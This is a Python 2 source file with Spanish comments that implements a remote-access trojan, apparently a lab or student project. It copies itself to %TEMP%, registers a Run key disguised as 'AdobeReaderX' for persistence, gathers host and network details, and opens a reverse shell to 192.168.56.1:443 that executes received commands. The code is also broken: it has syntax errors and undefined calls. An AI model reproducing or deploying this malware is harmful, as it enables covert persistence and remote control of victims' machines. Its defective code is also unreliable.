# -*- coding: utf-8 -*-
#from _winreg import *
import os
import sys
import platform
import getpass
import time
import base64
import subprocess
import _winreg
import ctypes
import getpass
import socket
import urllib
import uuid
from _winreg import HKEY_CURRENT_USER as HKCU

##################################################################################################################################### 
def windows_persistence():
    tempdir = '%TEMP%'
    fileName = sys.argv[0]    #argv[0] INDICA EL NOMBRE DEL SCRIPT EN EJECUCIÓN
    dir,file = os.path.split(fileName)
#    print dir		C:\USUARIO\BLA\BLA
#    print file		ARCHIVO.PY
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    
    #COPIA EL SCRIPT EN EJECUCIÓN A %TEMP%:
    os.system('copy %s %s'%(fileName, tempdir))
    bin_path = sys.executable

    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'AdobeReaderX', 0, _winreg.REG_SZ,(r"%TEMP%"+file))
        _winreg.CloseKey(reg_key)
        print 'HKCU Run registry key applied'
        return True
		
    except WindowsError:
        print 'HKCU Run registry key failed'
        return False
		
 
#####################################################################################################################################
def os_info():
	#SISTEMA OPERATIVO
	sys_platform = platform.platform()
	proces    = platform.processor()
	arch = platform.architecture()[0]

	#USUARIO EN SESIÓN
	user = getpass.getuser()

	#RED
	hostname    = socket.gethostname()
	fqdn        = socket.getfqdn()			#Nombre Domin. asociado
	internal_ip = socket.gethostbyname(hostname)
	raw_mac     = uuid.getnode()
	mac         = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))

	#IP EXTERNA
	ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
				   'ipecho.net/plain', 'myexternalip.com/raw',
				   'wtfismyip.com/text' ]
	external_ip = ''
	#PRUEBA TODAS LAS URLS DE LA LISTA
	for url in ex_ip_grab:
		try:
			#ABRE LA URL SELECCIONADA Y DEVUELVE LA INFORMACIÓN QUE RECIBE ELIMINANDO EL ESPACIADO EN BLANCO
			external_ip = urllib.urlopen('http://'+url).read().rstrip() #XXX.YYY.ZZZ.KKK
		except IOError:
			pass
		#SI NO HAY ERRORES EN LA IP Y ESTÁ COMPRENDIDA ENTRE 7 Y 15 (INCLUSIVES) DÍGITOS, TERMINA EL BUCLE DE LAS URLS
		if external_ip and (6 < len(external_ip) < 16):
			break

	# DATATIME DEL DISPOSITIVO
	dt = time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(time.tzname[0]),
		 time.localtime())
		
		

	all = {'Plataforma' : sys_platform, 'Procesador' : proces, 'Arquitectura' : arch, 'Usuario' : user, 'Hostname' : hostname, 'MAC' : mac, 'IP Interna' : internal_ip, 'IP Externa' : external_ip, 'Fecha' : dt }
	print all.items()

	return all
#####################################################################################################################################

		

		
		
#####################################################################################################################################
def shell():
	#CREAMOS EL SOCKET (DEFINIDO POR IPv4 Y TCP)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #CONECTAMOS EL SOCKET
	s.connect(('192.168.56.1', int(443)))
	#ENVIAMOS MENSAJE ACK AL SERVIDOR
    s.send('ACK!')
	#BUCLE DE LECTURA/ESCRITURA Y ENVÍO DE INFORMACIÓN
    while 1:
		#RECIBE INSTRUCCIÓN INICIAL (command, os_info, quit,...)
        data = s.recv(1024)
        if data == "quit": break
		elif data == 'command':
			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			stdout_value = proc.stdout.read() + proc.stderr.read()
			s.send(stdout_value)
        elif data = 'os_info':
			os_info(plat)
		elif data = 'persistence':
			persistence(tempdir, fileName, run)
		elif data = 'scan':
			scan_net()
	#CIERRA EL SOCKET
    s.close()
 
def main():
	
	#PLATAFORMA DEL SISTEMA (MAC/LINUX/WINDOWS)
	plat = sys.platform
    if plat.startswith('win'):
        plat = 'win'
    elif plat.startswith('linux'):
        plat = 'nix'
    elif plat.startswith('darwin'):
        plat = 'mac'
    else:
        plat = 'unk'
	
	#SHELL (CONEXIÓN INVERSA AL SERVIDOR)
    shell()
 
#MÉTODO ESPECIAL DE LAS CLASES PARA AUTO-INICIAR
if __name__ == "__main__":
        main()
